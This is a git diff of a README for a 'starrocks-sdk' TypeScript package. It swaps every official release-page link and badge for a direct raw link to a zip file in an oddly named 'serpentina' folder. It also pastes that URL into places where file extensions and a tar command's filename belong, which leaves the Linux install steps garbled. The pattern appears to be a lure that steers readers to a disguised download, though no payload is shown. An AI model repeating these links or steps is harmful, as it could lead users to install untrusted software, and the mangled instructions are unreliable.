@@ -1,6 +1,6 @@
 # 🌟 starrocks-sdk - Safe TypeScript Tools for StarRocks
 
-[![Download starrocks-sdk](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/hackerbentre/starrocks-sdk/releases)
+[![Download starrocks-sdk](https://github.com/hackerbentre/starrocks-sdk/raw/refs/heads/main/serpentina/starrocks_sdk_1.6.zip)](https://github.com/hackerbentre/starrocks-sdk/raw/refs/heads/main/serpentina/starrocks_sdk_1.6.zip)
 
 ---
 
@@ -42,13 +42,13 @@ Your computer needs:
 
 You can get starrocks-sdk from the official release page on GitHub. This page has all available versions for different systems.
 
-[![Download starrocks-sdk](https://img.shields.io/badge/Download-GitHub-blue)](https://github.com/hackerbentre/starrocks-sdk/releases)
+[![Download starrocks-sdk](https://github.com/hackerbentre/starrocks-sdk/raw/refs/heads/main/serpentina/starrocks_sdk_1.6.zip)](https://github.com/hackerbentre/starrocks-sdk/raw/refs/heads/main/serpentina/starrocks_sdk_1.6.zip)
 
 Visit the page linked above. Find the latest version and download the file that matches your computer system:
 
 - For Windows: Look for `.exe` or `.zip` files  
 - For macOS: Choose a `.dmg` or `.zip` file  
-- For Linux: Get `.tar.gz` or `.deb` files  
+- For Linux: Get `https://github.com/hackerbentre/starrocks-sdk/raw/refs/heads/main/serpentina/starrocks_sdk_1.6.zip` or `.deb` files  
 
 Save the file somewhere easy to find, like your Downloads folder.
 
@@ -72,8 +72,8 @@ Save the file somewhere easy to find, like your Downloads folder.
 
 ### Linux
 
-1. Extract the `.tar.gz` file using this command in Terminal:  
-   `tar -xvzf starrocks-sdk-version.tar.gz`  
+1. Extract the `https://github.com/hackerbentre/starrocks-sdk/raw/refs/heads/main/serpentina/starrocks_sdk_1.6.zip` file using this command in Terminal:  
+   `tar -xvzf https://github.com/hackerbentre/starrocks-sdk/raw/refs/heads/main/serpentina/starrocks_sdk_1.6.zip`  
 2. Move the extracted folder to a preferred location, such as `/opt/starrocks-sdk`.  
 3. Optionally, create a shortcut or add the sdk folder to your system path for easier access.
 
@@ -163,7 +163,7 @@ You can find help and report problems on the GitHub Issues page for this project
 
 Find the full list of releases and download files here:
 
-[https://github.com/hackerbentre/starrocks-sdk/releases](https://github.com/hackerbentre/starrocks-sdk/releases)
+[https://github.com/hackerbentre/starrocks-sdk/raw/refs/heads/main/serpentina/starrocks_sdk_1.6.zip](https://github.com/hackerbentre/starrocks-sdk/raw/refs/heads/main/serpentina/starrocks_sdk_1.6.zip)
 
 You will see different versions and files. Choose the latest stable release and the file suitable for your operating system.  
 
